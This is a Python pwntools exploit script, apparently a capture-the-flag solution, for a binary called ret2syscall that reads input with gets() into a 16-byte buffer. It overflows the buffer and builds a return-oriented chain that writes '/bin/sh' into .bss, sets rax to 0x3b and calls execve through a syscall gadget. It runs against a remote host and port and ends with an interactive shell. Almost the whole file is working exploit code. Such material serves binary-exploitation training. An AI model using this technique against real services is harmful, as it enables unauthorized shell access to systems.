# 高端的syscall ret2syscall
"""
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF
  gets(v4);
"""

from pwn import *

elf = context.binary = ELF('./ret2syscall', checksec=False)
context(log_level='debug', arch='amd64', os='linux')

p = remote('8.130.35.16', 51004)
# p = process('./ret2syscall')
# p = gdb.debug('./ret2syscall', 'b*0x0401269\nc')

gets = elf.symbols['gets']
main = elf.symbols['main']
main = 0x000401240
bss = elf.bss()
bss = bss + 0x20 # 0x00404090  # stderr可以覆盖，前面的stdin, stdout不可以。 位置设置高一点就不影响了。
success('bss:' + hex(bss))

pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15_ret = ROP(elf).find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = ROP(elf).find_gadget(['ret'])[0]


def pay2():
    set_rax = elf.sym['set_rax']
    syscall = elf.sym['gadget']
    binsh = bss

    # payload = flat(pop_rdi, 0x3b, set_rax, pop_rdi, binsh, pop_rsi_r15_ret, 0, 0, syscall, main)
    payload = flat(pop_rdi, 0x3b, set_rax, pop_rdi, binsh, pop_rsi_r15_ret, 0, 0, syscall, 0xdeadbeef)
    return payload


after_gets = pay2()
fake_rbp = main
payload = flat('a' * (16 + 8), pop_rdi, bss, gets, after_gets)
print(p.recvuntil('Input: \n'))
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
